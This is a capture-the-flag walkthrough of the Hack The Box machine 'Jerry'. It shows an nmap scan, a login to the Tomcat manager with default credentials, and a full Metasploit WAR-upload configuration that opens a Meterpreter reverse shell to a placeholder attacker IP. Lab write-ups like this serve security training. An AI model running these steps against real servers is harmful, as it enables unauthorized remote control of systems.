Hack The Box — Jerry (Easy)

**Status**: Retired  
**OS**: Windows  
**IP**: 10.10.10.95  
**Difficulty**: 🧩 Beginner-Friendly  
**Category**: Remote Code Execution (RCE), Misconfigurations  
**Owned**: ✅ User + ✅ System (ROOT)

---

## 🚀 Recon & Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -Pn 10.10.10.95

Result:

    8080/tcp – Apache Tomcat/Coyote JSP engine 1.1

    OS Fingerprint: Windows

Apache Tomcat on port 8080 is a juicy target. Time to investigate further.
🌐 Web Exploration

Accessing http://10.10.10.95:8080 leads to the Apache Tomcat Manager Interface, but prompts for credentials.

We test default logins:

    ✅ tomcat:s3cret — Success

Logged into the Tomcat Web Application Manager.
💥 Exploitation – RCE via WAR Deployment

Tomcat’s Manager allows uploading of .WAR (Web ARchive) files. This is our RCE gateway.
🔧 Exploit Used:

exploit/multi/http/tomcat_mgr_upload

Configuration:

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.95
set HTTPUSERNAME tomcat
set HTTPPASSWORD s3cret
set TARGETURI /manager/html
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run

Boom 💣 — got a reverse shell.
🛡️ Privilege Escalation?

None needed. Apache was running as SYSTEM. We own the box instantly after shell access.
🏴 Flags

    user.txt ✅

    root.txt ✅

Bonus: Found 2-for-1.txt in the admin’s desktop — both flags combined.
